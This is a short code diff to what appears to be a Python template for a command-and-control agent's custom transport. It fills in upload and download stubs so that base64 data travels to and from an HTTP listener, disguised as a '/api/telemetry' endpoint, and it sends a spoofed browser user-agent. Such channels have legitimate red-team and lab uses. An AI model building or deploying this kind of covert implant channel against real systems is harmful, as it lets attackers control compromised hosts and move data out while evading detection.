@@ -11,21 +11,22 @@ import base64
 import math
 from typing import List
 
-url = 'http://127.0.0.1/test' # TODO: Replace with your own HTTP listener URL
+URL = 'http://127.0.0.1:4696' # TODO: Replace with your own HTTP listener URL
 magic = b"\x41\x41\x41\x41"
 agentid = 234234  # this values is changed later with a random one
 user_agent = 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36'
 
 def uploadData(data):
-    # TODO: Implement your own data upload logic here - 'data' is a base64 string
-    agent_upload()
+    requests.post(
+        f"{URL}/api/telemetry",
+        json = {"data": data}   
+    )
     return
 
 def downloadData():
-    # TODO: Implement your own data download logic here
-    # Make sure to return a base64 string or an empty string if no data is available
-    agent_download()
-    return ""
+    r = requests.get(f"{URL}/api/telemetry")
+    result = r.json().get("data")
+    return result if result else ""
 
 def get_random_string(length):
     # choose from all lowercase letter
